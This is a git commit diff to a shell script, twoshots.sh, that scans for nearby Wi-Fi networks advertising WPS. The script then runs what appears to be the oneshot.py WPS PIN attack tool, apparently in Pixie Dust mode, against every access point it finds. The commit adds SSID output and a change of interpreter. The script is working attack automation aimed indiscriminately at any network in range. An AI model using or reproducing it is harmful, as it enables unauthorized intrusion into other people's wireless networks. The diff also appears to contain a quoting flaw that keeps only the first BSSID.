8b02f2eac30e94406dad6ef301e2f97cd2e20426
Bogdan Shchogolev <bogdan993000@gmail.com>
2020-07-02 23:50:08 +0300

    Clear bssids output
    Changed interpreter to sh. Cleared output bssids via sed.

--- twoshots.sh
+++ twoshots.sh
@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 
 if [ "$1" ]
 then
@@ -7,11 +7,26 @@ else
 	IFACE="wlan0"
 fi
 
-TARGETS=$(iw dev $IFACE scan |\
-awk -v iface="$IFACE)" '$3 == iface {MAC = $2;wifi[MAC]["BSSID"] = MAC}; $1 == "WPS:" {printf "%s\n",wifi[MAC]["BSSID"]}' |\
-cut -d '(' -f 1)
+echo "Scanning networks around..."
 
-for TARGET in $TARGETS
+TARGETS=$(iw dev $IFACE scan |\
+awk -v iface="$IFACE)" '$3 == iface {MAC = $2;wifi[MAC]["BSSID"] = MAC};\
+                        $1 == "SSID:" {wifi[MAC]["SSID"] = $2};\
+                        $1 == "WPS:" {printf "%s\t%s\n",wifi[MAC]["BSSID"],wifi[MAC]["SSID"]}'|\
+sed --expression='s/(on//g')
+
+if [ "$TARGETS" ]
+then
+	echo "Found targets:"
+	echo "$TARGETS"
+else
+	echo "No targets found"
+	exit
+fi
+
+TARGETS_BSSIDS=$(echo $TARGETS | awk '{print $1}')
+
+for TARGET in $TARGETS_BSSIDS
 do
 	python3 oneshot.py --bssid $TARGET -K -F -i $IFACE -w
 done
